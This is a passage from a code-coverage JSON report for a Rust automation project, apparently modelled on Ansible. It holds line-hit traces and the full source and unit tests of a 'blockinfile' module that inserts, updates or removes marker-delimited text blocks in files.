}\n}\n","traces":[{"line":21,"address":[30678464,30679425,30679447],"length":1,"stats":{"Line":1}},{"line":28,"address":[30678530],"length":1,"stats":{"Line":1}},{"line":30,"address":[30678884,30678752,30678663],"length":1,"stats":{"Line":2}},{"line":31,"address":[29609838,29609923],"length":1,"stats":{"Line":0}},{"line":39,"address":[30679052,30678981],"length":1,"stats":{"Line":2}},{"line":40,"address":[30679095,30679162],"length":1,"stats":{"Line":2}},{"line":41,"address":[30679132,30679179],"length":1,"stats":{"Line":2}},{"line":42,"address":[30679185],"length":1,"stats":{"Line":1}},{"line":43,"address":[30679225],"length":1,"stats":{"Line":1}},{"line":44,"address":[30679265],"length":1,"stats":{"Line":1}},{"line":45,"address":[30679308],"length":1,"stats":{"Line":1}},{"line":47,"address":[30679356],"length":1,"stats":{"Line":1}},{"line":51,"address":[30680390,30679472,30680384],"length":1,"stats":{"Line":1}},{"line":56,"address":[30679541],"length":1,"stats":{"Line":1}},{"line":57,"address":[30679576],"length":1,"stats":{"Line":1}},{"line":59,"address":[30679699,30679634],"length":1,"stats":{"Line":2}},{"line":60,"address":[30679966,30680093,30679799],"length":1,"stats":{"Line":3}},{"line":66,"address":[30680107],"length":1,"stats":{"Line":1}},{"line":68,"address":[30680010],"length":1,"stats":{"Line":0}},{"line":70,"address":[30680050,30680219],"length":1,"stats":{"Line":0}},{"line":75,"address":[30679829],"length":1,"stats":{"Line":1}},{"line":80,"address":[30673024],"length":1,"stats":{"Line":0}},{"line":84,"address":[30672400],"length":1,"stats":{"Line":0}},{"line":88,"address":[30672432],"length":1,"stats":{"Line":0}},{"line":93,"address":[30672928],"length":1,"stats":{"Line":0}},{"line":98,"address":[30672448],"length":1,"stats":{"Line":0}},{"line":102,"address":[30672480],"length":1,"stats":{"Line":1}},{"line":104,"address":[30672526],"length":1,"stats":{"Line":1}},{"line":105,"address":[30672653],"length":1,"stats":{"Line":1}},{"line":106,"address":[30672625],"length":1,"stats":{"Line":1}},{"line":111,"address":[30672569,30672738],"length":1,"stats":{"Line":0}},{"line":112,"address":[30672751],"length":1,"stats":{"Line":0}},{"line":115,"address":[30672817],"length":1,"stats":{"Line":0}},{"line":116,"address":[30672786],"length":1,"stats":{"Line":0}},{"line":122,"address":[30672771],"length":1,"stats":{"Line":0}},{"line":125,"address":[30673905,30673913,30673104],"length":1,"stats":{"Line":1}},{"line":131,"address":[30673186],"length":1,"stats":{"Line":1}},{"line":132,"address":[30673661,30673911,30673500],"length":1,"stats":{"Line":1}},{"line":133,"address":[30673578],"length":1,"stats":{"Line":1}},{"line":134,"address":[30673606],"length":1,"stats":{"Line":1}},{"line":135,"address":[30673631,30673983],"length":1,"stats":{"Line":2}},{"line":136,"address":[30674097],"length":1,"stats":{"Line":1}},{"line":137,"address":[30678100,30678046],"length":1,"stats":{"Line":2}},{"line":138,"address":[30678093,30678132],"length":1,"stats":{"Line":0}},{"line":141,"address":[30674115],"length":1,"stats":{"Line":1}},{"line":144,"address":[30673368],"length":1,"stats":{"Line":0}},{"line":145,"address":[30673334],"length":1,"stats":{"Line":0}},{"line":151,"address":[30673875,30678036,30674228],"length":1,"stats":{"Line":2}},{"line":152,"address":[30677974,30674417,30674526],"length":1,"stats":{"Line":2}},{"line":153,"address":[30674715,30674816],"length":1,"stats":{"Line":2}},{"line":156,"address":[30674825],"length":1,"stats":{"Line":1}},{"line":159,"address":[30677369,30675177,30675100],"length":1,"stats":{"Line":3}},{"line":161,"address":[30676719,30675225,30676823],"length":1,"stats":{"Line":3}},{"line":162,"address":[30676775],"length":1,"stats":{"Line":1}},{"line":163,"address":[30676832],"length":1,"stats":{"Line":1}},{"line":164,"address":[30676920,30677255],"length":1,"stats":{"Line":2}},{"line":166,"address":[30677064],"length":1,"stats":{"Line":1}},{"line":168,"address":[30676959,30676896],"length":1,"stats":{"Line":2}},{"line":169,"address":[30676967],"length":1,"stats":{"Line":1}},{"line":173,"address":[30676838],"length":1,"stats":{"Line":1}},{"line":176,"address":[30677267],"length":1,"stats":{"Line":1}},{"line":177,"address":[30677615,30677273],"length":1,"stats":{"Line":2}},{"line":178,"address":[30677414,30677286],"length":1,"stats":{"Line":2}},{"line":179,"address":[30677575],"length":1,"stats":{"Line":1}},{"line":180,"address":[30677422],"length":1,"stats":{"Line":1}},{"line":181,"address":[30677499],"length":1,"stats":{"Line":1}},{"line":182,"address":[29609680,29609717],"length":1,"stats":{"Line":3}},{"line":183,"address":[30677563],"length":1,"stats":{"Line":1}},{"line":188,"address":[30677317],"length":1,"stats":{"Line":1}},{"line":191,"address":[30675271,30675375,30675183],"length":1,"stats":{"Line":3}},{"line":192,"address":[30675327],"length":1,"stats":{"Line":1}},{"line":194,"address":[30675624],"length":1,"stats":{"Line":1}},{"line":196,"address":[30675470,30675377],"length":1,"stats":{"Line":2}},{"line":197,"address":[30675478],"length":1,"stats":{"Line":1}},{"line":198,"address":[30675521],"length":1,"stats":{"Line":1}},{"line":202,"address":[30675404],"length":1,"stats":{"Line":1}},{"line":205,"address":[30676211,30675882],"length":1,"stats":{"Line":2}},{"line":206,"address":[30675898,30675969],"length":1,"stats":{"Line":2}},{"line":207,"address":[30676171],"length":1,"stats":{"Line":1}},{"line":208,"address":[30675977],"length":1,"stats":{"Line":1}},{"line":209,"address":[30676066],"length":1,"stats":{"Line":1}},{"line":210,"address":[29609584,29609621],"length":1,"stats":{"Line":3}},{"line":211,"address":[30676156],"length":1,"stats":{"Line":1}},{"line":214,"address":[30676281,30676531],"length":1,"stats":{"Line":2}},{"line":215,"address":[30676294],"length":1,"stats":{"Line":1}},{"line":216,"address":[30676491],"length":1,"stats":{"Line":1}},{"line":217,"address":[30676333],"length":1,"stats":{"Line":1}},{"line":218,"address":[30676413],"length":1,"stats":{"Line":1}},{"line":219,"address":[29609525,29609488],"length":1,"stats":{"Line":3}},{"line":220,"address":[30676479],"length":1,"stats":{"Line":1}},{"line":224,"address":[30676601],"length":1,"stats":{"Line":1}},{"line":228,"address":[30673056],"length":1,"stats":{"Line":1}},{"line":230,"address":[30673083],"length":1,"stats":{"Line":1}},{"line":233,"address":[30672944],"length":1,"stats":{"Line":0}},{"line":239,"address":[30672970],"length":1,"stats":{"Line":0}}],"covered":77,"coverable":95},{"path":["/","home","artur","Repositories","rustible","src","modules","blockinfile.rs"],"content":"//! Block-in-file module - Manage text blocks in files\n//!\n//! This module inserts, updates, or removes blocks of multi-line text\n//! surrounded by customizable marker comments.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse std::fs;\nuse std::os::unix::fs::PermissionsExt;\nuse std::path::Path;\n\n/// Desired state for a block\n#[derive(Debug, Clone, PartialEq)]\npub enum BlockState {\n    Present,\n    Absent,\n}\n\nimpl BlockState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" =\u003e Ok(BlockState::Present),\n            \"absent\" =\u003e Ok(BlockState::Absent),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for block-in-file operations\npub struct BlockinfileModule;\n\nimpl BlockinfileModule {\n    /// Read file content into lines\n    fn read_file(path: \u0026Path) -\u003e ModuleResult\u003cVec\u003cString\u003e\u003e {\n        if !path.exists() {\n            return Ok(Vec::new());\n        }\n\n        let content = fs::read_to_string(path)?;\n        Ok(content.lines().map(|s| s.to_string()).collect())\n    }\n\n    /// Write lines to file\n    fn write_file(\n        path: \u0026Path,\n        lines: \u0026[String],\n        create: bool,\n        mode: Option\u003cu32\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        if !path.exists() \u0026\u0026 !create {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"File '{}' does not exist and create=false\",\n                path.display()\n            )));\n        }\n\n        // Create parent directories if needed\n        if let Some(parent) = path.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        let content = if lines.is_empty() {\n            String::new()\n        } else {\n            format!(\"{}\\n\", lines.join(\"\\n\"))\n        };\n\n        fs::write(path, content)?;\n\n        if let Some(mode) = mode {\n            fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n        }\n\n        Ok(())\n    }\n\n    /// Create a backup of the file\n    fn create_backup(path: \u0026Path, suffix: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        if path.exists() {\n            let backup_path = format!(\"{}{}\", path.display(), suffix);\n            fs::copy(path, \u0026backup_path)?;\n            Ok(Some(backup_path))\n        } else {\n            Ok(None)\n        }\n    }\n\n    /// Generate marker lines\n    fn create_markers(marker: \u0026str) -\u003e (String, String) {\n        let begin_marker = marker.replace(\"{mark}\", \"BEGIN\");\n        let end_marker = marker.replace(\"{mark}\", \"END\");\n        (begin_marker, end_marker)\n    }\n\n    /// Find the block boundaries in the file\n    fn find_block(\n        lines: \u0026[String],\n        begin_marker: \u0026str,\n        end_marker: \u0026str,\n    ) -\u003e Option\u003c(usize, usize)\u003e {\n        let mut begin_idx = None;\n        let mut end_idx = None;\n\n        for (i, line) in lines.iter().enumerate() {\n            if line.contains(begin_marker) {\n                begin_idx = Some(i);\n            } else if line.contains(end_marker) \u0026\u0026 begin_idx.is_some() {\n                end_idx = Some(i);\n                break;\n            }\n        }\n\n        match (begin_idx, end_idx) {\n            (Some(start), Some(end)) if start \u003c end =\u003e Some((start, end)),\n            _ =\u003e None,\n        }\n    }\n\n    /// Insert or update a block in the file\n    fn ensure_block_present(\n        lines: \u0026mut Vec\u003cString\u003e,\n        block: \u0026str,\n        begin_marker: \u0026str,\n        end_marker: \u0026str,\n        insertafter: Option\u003c\u0026str\u003e,\n        insertbefore: Option\u003c\u0026str\u003e,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let block_lines: Vec\u003cString\u003e = block.lines().map(|s| s.to_string()).collect();\n\n        // Check if block already exists\n        if let Some((start, end)) = Self::find_block(lines, begin_marker, end_marker) {\n            // Extract current block content (excluding markers)\n            let current_block: Vec\u003cString\u003e = lines[(start + 1)..end].to_vec();\n\n            // Check if content is the same\n            if current_block == block_lines {\n                return Ok(false); // No changes needed\n            }\n\n            // Replace the block content\n            lines.splice((start + 1)..end, block_lines.iter().cloned());\n            return Ok(true);\n        }\n\n        // Block doesn't exist, insert it\n        let insert_pos = if let Some(pattern) = insertbefore {\n            match pattern.to_uppercase().as_str() {\n                \"BOF\" =\u003e 0,\n                _ =\u003e {\n                    // Find first line matching pattern\n                    lines\n                        .iter()\n                        .position(|l| l.contains(pattern))\n                        .unwrap_or(lines.len())\n                }\n            }\n        } else if let Some(pattern) = insertafter {\n            match pattern.to_uppercase().as_str() {\n                \"EOF\" =\u003e lines.len(),\n                _ =\u003e {\n                    // Find last line matching pattern\n                    lines\n                        .iter()\n                        .rposition(|l| l.contains(pattern))\n                        .map(|pos| pos + 1)\n                        .unwrap_or(lines.len())\n                }\n            }\n        } else {\n            lines.len() // Default to EOF\n        };\n\n        // Build complete block with markers\n        let mut new_block = vec![begin_marker.to_string()];\n        new_block.extend(block_lines);\n        new_block.push(end_marker.to_string());\n\n        // Insert the block\n        lines.splice(insert_pos..insert_pos, new_block);\n\n        Ok(true)\n    }\n\n    /// Remove a block from the file\n    fn ensure_block_absent(\n        lines: \u0026mut Vec\u003cString\u003e,\n        begin_marker: \u0026str,\n        end_marker: \u0026str,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        if let Some((start, end)) = Self::find_block(lines, begin_marker, end_marker) {\n            // Remove the entire block including markers\n            lines.drain(start..=end);\n            Ok(true)\n        } else {\n            Ok(false) // Block doesn't exist, no changes needed\n        }\n    }\n}\n\nimpl Module for BlockinfileModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"blockinfile\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Insert/update/remove a block of multi-line text surrounded by markers\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::NativeTransport\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"path\"]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        let state = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n\n        if state == \"present\" \u0026\u0026 params.get(\"block\").is_none() {\n            return Err(ModuleError::MissingParameter(\n                \"Parameter 'block' is required for state=present\".to_string(),\n            ));\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let path = Path::new(\u0026path_str);\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = BlockState::from_str(\u0026state_str)?;\n        let block = params.get_string(\"block\")?;\n        let marker = params\n            .get_string(\"marker\")?\n            .unwrap_or_else(|| \"# {mark} ANSIBLE MANAGED BLOCK\".to_string());\n        let insertafter = params.get_string(\"insertafter\")?;\n        let insertbefore = params.get_string(\"insertbefore\")?;\n        let create = params.get_bool_or(\"create\", false);\n        let backup = params.get_bool_or(\"backup\", false);\n        let backup_suffix = params\n            .get_string(\"backup_suffix\")?\n            .unwrap_or_else(|| \"~\".to_string());\n        let mode = params.get_u32(\"mode\")?;\n\n        let (begin_marker, end_marker) = Self::create_markers(\u0026marker);\n\n        // Check if file exists\n        if !path.exists() \u0026\u0026 !create {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"File '{}' does not exist\",\n                path_str\n            )));\n        }\n\n        // Read current content\n        let mut lines = Self::read_file(path)?;\n        let original_lines = lines.clone();\n\n        // Apply changes based on state\n        let changed = match state {\n            BlockState::Present =\u003e {\n                let block_str = block.as_ref().ok_or_else(|| {\n                    ModuleError::MissingParameter(\"block is required for state=present\".to_string())\n                })?;\n\n                Self::ensure_block_present(\n                    \u0026mut lines,\n                    block_str,\n                    \u0026begin_marker,\n                    \u0026end_marker,\n                    insertafter.as_deref(),\n                    insertbefore.as_deref(),\n                )?\n            }\n            BlockState::Absent =\u003e {\n                Self::ensure_block_absent(\u0026mut lines, \u0026begin_marker, \u0026end_marker)?\n            }\n        };\n\n        if !changed {\n            return Ok(ModuleOutput::ok(format!(\n                \"File '{}' already has desired block state\",\n                path_str\n            )));\n        }\n\n        // In check mode, don't actually write\n        if context.check_mode {\n            let diff = if context.diff_mode {\n                Some(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\")))\n            } else {\n                None\n            };\n\n            let mut output = ModuleOutput::changed(format!(\"Would modify '{}'\", path_str));\n\n            if let Some(d) = diff {\n                output = output.with_diff(d);\n            }\n\n            return Ok(output);\n        }\n\n        // Create backup if requested\n        let backup_file = if backup {\n            Self::create_backup(path, \u0026backup_suffix)?\n        } else {\n            None\n        };\n\n        // Write the file\n        Self::write_file(path, \u0026lines, create, mode)?;\n\n        let mut output = ModuleOutput::changed(format!(\"Modified '{}'\", path_str));\n\n        if let Some(backup_path) = backup_file {\n            output = output.with_data(\"backup_file\", serde_json::json!(backup_path));\n        }\n\n        if context.diff_mode {\n            output = output.with_diff(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\")));\n        }\n\n        Ok(output)\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let path = Path::new(\u0026path_str);\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = BlockState::from_str(\u0026state_str)?;\n        let block = params.get_string(\"block\")?;\n        let marker = params\n            .get_string(\"marker\")?\n            .unwrap_or_else(|| \"# {mark} ANSIBLE MANAGED BLOCK\".to_string());\n        let insertafter = params.get_string(\"insertafter\")?;\n        let insertbefore = params.get_string(\"insertbefore\")?;\n\n        let (begin_marker, end_marker) = Self::create_markers(\u0026marker);\n\n        let mut lines = Self::read_file(path)?;\n        let original_lines = lines.clone();\n\n        let changed = match state {\n            BlockState::Present =\u003e {\n                if let Some(block_str) = block {\n                    Self::ensure_block_present(\n                        \u0026mut lines,\n                        \u0026block_str,\n                        \u0026begin_marker,\n                        \u0026end_marker,\n                        insertafter.as_deref(),\n                        insertbefore.as_deref(),\n                    )?\n                } else {\n                    false\n                }\n            }\n            BlockState::Absent =\u003e {\n                Self::ensure_block_absent(\u0026mut lines, \u0026begin_marker, \u0026end_marker)?\n            }\n        };\n\n        if changed {\n            Ok(Some(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\"))))\n        } else {\n            Ok(None)\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_blockinfile_insert() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\n\").unwrap();\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\n            \"block\".to_string(),\n            serde_json::json!(\"block line 1\\nblock line 2\"),\n        );\n        params.insert(\n            \"marker\".to_string(),\n            serde_json::json!(\"# {mark} TEST BLOCK\"),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(content.contains(\"# BEGIN TEST BLOCK\"));\n        assert!(content.contains(\"block line 1\"));\n        assert!(content.contains(\"block line 2\"));\n        assert!(content.contains(\"# END TEST BLOCK\"));\n    }\n\n    #[test]\n    fn test_blockinfile_idempotent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\n            \u0026path,\n            \"line1\\n# BEGIN TEST BLOCK\\nblock line 1\\nblock line 2\\n# END TEST BLOCK\\nline2\\n\",\n        )\n        .unwrap();\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\n            \"block\".to_string(),\n            serde_json::json!(\"block line 1\\nblock line 2\"),\n        );\n        params.insert(\n            \"marker\".to_string(),\n            serde_json::json!(\"# {mark} TEST BLOCK\"),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n    }\n\n    #[test]\n    fn test_blockinfile_update() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\n            \u0026path,\n            \"line1\\n# BEGIN TEST BLOCK\\nold content\\n# END TEST BLOCK\\nline2\\n\",\n        )\n        .unwrap();\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"block\".to_string(), serde_json::json!(\"new content\"));\n        params.insert(\n            \"marker\".to_string(),\n            serde_json::json!(\"# {mark} TEST BLOCK\"),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(content.contains(\"new content\"));\n        assert!(!content.contains(\"old content\"));\n    }\n\n    #[test]\n    fn test_blockinfile_absent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\n            \u0026path,\n            \"line1\\n# BEGIN TEST BLOCK\\nblock content\\n# END TEST BLOCK\\nline2\\n\",\n        )\n        .unwrap();\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"absent\"));\n        params.insert(\n            \"marker\".to_string(),\n            serde_json::json!(\"# {mark} TEST BLOCK\"),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(!content.contains(\"BEGIN TEST BLOCK\"));\n        assert!(!content.contains(\"block content\"));\n        assert!(!content.contains(\"END TEST BLOCK\"));\n        assert!(content.contains(\"line1\"));\n        assert!(content.contains(\"line2\"));\n    }\n\n    #[test]\n    fn test_blockinfile_create() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"new_file.txt\");\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"block\".to_string(), serde_json::json!(\"new block\"));\n        params.insert(\"create\".to_string(), serde_json::json!(true));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(path.exists());\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(content.contains(\"new block\"));\n    }\n\n    #[test]\n    fn test_blockinfile_insertafter() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\nline3\\n\").unwrap();\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"block\".to_string(), serde_json::json!(\"block content\"));\n        params.insert(\"insertafter\".to_string(), serde_json::json!(\"line1\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        let lines: Vec\u003c_\u003e = content.lines().collect();\n\n        // Find BEGIN marker position\n        let begin_pos = lines.iter().position(|l| l.contains(\"BEGIN\")).unwrap();\n        // It should be after line1 (which is at index 0)\n        assert!(begin_pos \u003e 0);\n    }\n\n    #[test]\n    fn test_blockinfile_check_mode() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\n\").unwrap();\n\n        let module = BlockinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"block\".to_string(), serde_json::json!(\"block content\"));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would modify\"));\n\n        // File should not be modified\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(!content.contains(\"block content\"));\n    }\n}\n","traces":[{"line":22,"address":[25788496,25789033,25789039],"length":1,"stats":{"Line":1}},{"line":23,"address":[25788523,25788625],"length":1,"stats":{"Line":2}},{"line":24,"address":[25788712,25788641],"length":1,"stats":{"Line":2}},{"line":25,"address":[25788781,25788684,25788738],"length":1,"stats":{"Line":3}},{"line":26,"address":[25788749,25788803],"length":1,"stats":{"Line":0}},{"line":39,"address":[25795296,25795805,25795811],"length":1,"stats":{"Line":1}},{"line":40,"address":[25795355],"length":1,"stats":{"Line":1}},{"line":41,"address":[25795364],"length":1,"stats":{"Line":1}},{"line":44,"address":[25795432,25795519],"length":1,"stats":{"Line":1}},{"line":45,"address":[25795606,25795682],"length":1,"stats":{"Line":4}},{"line":49,"address":[25789744,25790789,25790795],"length":1,"stats":{"Line":1}},{"line":55,"address":[25789869],"length":1,"stats":{"Line":1}},{"line":56,"address":[25789991],"length":1,"stats":{"Line":0}},{"line":58,"address":[25789970],"length":1,"stats":{"Line":0}},{"line":63,"address":[25790240,25789898],"length":1,"stats":{"Line":2}},{"line":64,"address":[25790282],"length":1,"stats":{"Line":1}},{"line":65,"address":[25790328],"length":1,"stats":{"Line":0}},{"line":69,"address":[25790303],"length":1,"stats":{"Line":1}},{"line":70,"address":[25790497],"length":1,"stats":{"Line":0}},{"line":72,"address":[25790430,25790515],"length":1,"stats":{"Line":1}},{"line":75,"address":[25790678,25790813],"length":1,"stats":{"Line":1}},{"line":77,"address":[25790846],"length":1,"stats":{"Line":1}},{"line":78,"address":[25790869,25790967],"length":1,"stats":{"Line":0}},{"line":81,"address":[25790944],"length":1,"stats":{"Line":1}},{"line":85,"address":[25791763,25791008,25791757],"length":1,"stats":{"Line":0}},{"line":86,"address":[25791158,25791736,25791077],"length":1,"stats":{"Line":0}},{"line":87,"address":[25791173],"length":1,"stats":{"Line":0}},{"line":88,"address":[25791398,25791479],"length":1,"stats":{"Line":0}},{"line":89,"address":[25791597],"length":1,"stats":{"Line":0}},{"line":91,"address":[25791091],"length":1,"stats":{"Line":0}},{"line":96,"address":[25792077,25792083,25791776],"length":1,"stats":{"Line":1}},{"line":97,"address":[25791819],"length":1,"stats":{"Line":1}},{"line":98,"address":[25791903],"length":1,"stats":{"Line":1}},{"line":99,"address":[25791980],"length":1,"stats":{"Line":1}},{"line":103,"address":[25789056],"length":1,"stats":{"Line":1}},{"line":108,"address":[25789175],"length":1,"stats":{"Line":1}},{"line":109,"address":[25789184],"length":1,"stats":{"Line":1}},{"line":111,"address":[25789193,25789277],"length":1,"stats":{"Line":2}},{"line":112,"address":[25789379,25789539],"length":1,"stats":{"Line":2}},{"line":113,"address":[25789525],"length":1,"stats":{"Line":1}},{"line":114,"address":[25789485,25789544],"length":1,"stats":{"Line":2}},{"line":115,"address":[25789568],"length":1,"stats":{"Line":1}},{"line":120,"address":[25789587,25789412],"length":1,"stats":{"Line":2}},{"line":121,"address":[25789615],"length":1,"stats":{"Line":1}},{"line":122,"address":[25789606],"length":1,"stats":{"Line":1}},{"line":127,"address":[25793548,25792384,25795252],"length":1,"stats":{"Line":1}},{"line":135,"address":[25792635],"length":1,"stats":{"Line":3}},{"line":138,"address":[25792854,25792738],"length":1,"stats":{"Line":2}},{"line":140,"address":[25793023,25792937],"length":1,"stats":{"Line":2}},{"line":143,"address":[25793189,25793104],"length":1,"stats":{"Line":2}},{"line":144,"address":[25793233],"length":1,"stats":{"Line":1}},{"line":148,"address":[25793255,25793203],"length":1,"stats":{"Line":2}},{"line":149,"address":[25793471],"length":1,"stats":{"Line":1}},{"line":153,"address":[25793554,25792959],"length":1,"stats":{"Line":1}},{"line":154,"address":[25793669,25793586],"length":1,"stats":{"Line":0}},{"line":155,"address":[25793752,25793826],"length":1,"stats":{"Line":0}},{"line":158,"address":[25793799,25793902,25794067],"length":1,"stats":{"Line":0}},{"line":160,"address":[30272144,30272176],"length":1,"stats":{"Line":0}},{"line":161,"address":[25793997],"length":1,"stats":{"Line":0}},{"line":164,"address":[25793692,25794122,25793621,25794075],"length":1,"stats":{"Line":2}},{"line":165,"address":[25794227,25794154],"length":1,"stats":{"Line":2}},{"line":166,"address":[25794637,25794310,25794386],"length":1,"stats":{"Line":1}},{"line":169,"address":[25794357,25794446,25794602],"length":1,"stats":{"Line":3}},{"line":171,"address":[30272256,30272224],"length":1,"stats":{"Line":3}},{"line":172,"address":[25794505],"length":1,"stats":{"Line":3}},{"line":173,"address":[25794550],"length":1,"stats":{"Line":1}},{"line":177,"address":[25794197,25794655],"length":1,"stats":{"Line":2}},{"line":181,"address":[25794692,25795247,25794104],"length":1,"stats":{"Line":2}},{"line":182,"address":[25794912],"length":1,"stats":{"Line":1}},{"line":183,"address":[25795036],"length":1,"stats":{"Line":1}},{"line":186,"address":[25795090],"length":1,"stats":{"Line":1}},{"line":188,"address":[25795187],"length":1,"stats":{"Line":1}},{"line":192,"address":[25792096],"length":1,"stats":{"Line":1}},{"line":197,"address":[25792186,25792335],"length":1,"stats":{"Line":2}},{"line":199,"address":[25792266],"length":1,"stats":{"Line":1}},{"line":200,"address":[25792318],"length":1,"stats":{"Line":1}},{"line":202,"address":[25792342],"length":1,"stats":{"Line":0}},{"line":208,"address":[25801424],"length":1,"stats":{"Line":0}},{"line":212,"address":[25796112],"length":1,"stats":{"Line":0}},{"line":216,"address":[25796144],"length":1,"stats":{"Line":0}},{"line":220,"address":[25796160],"length":1,"stats":{"Line":0}},{"line":224,"address":[25796809,25796815,25796192],"length":1,"stats":{"Line":0}},{"line":225,"address":[25796366,25796260],"length":1,"stats":{"Line":0}},{"line":227,"address":[25796417],"length":1,"stats":{"Line":0}},{"line":229,"address":[25796557,25796452,25796515],"length":1,"stats":{"Line":0}},{"line":230,"address":[25796680],"length":1,"stats":{"Line":0}},{"line":231,"address":[25796631],"length":1,"stats":{"Line":0}},{"line":235,"address":[25796526],"length":1,"stats":{"Line":0}},{"line":238,"address":[25801888,25808035,25810027],"length":1,"stats":{"Line":1}},{"line":243,"address":[25801980],"length":1,"stats":{"Line":1}},{"line":244,"address":[25802383,25802280],"length":1,"stats":{"Line":2}},{"line":245,"address":[25802464,25802548,25810025],"length":1,"stats":{"Line":1}},{"line":247,"address":[30287260,30287248],"length":1,"stats":{"Line":3}},{"line":248,"address":[25810004,25802734,25802643],"length":1,"stats":{"Line":2}},{"line":249,"address":[25810002,25802895],"length":1,"stats":{"Line":1}},{"line":250,"address":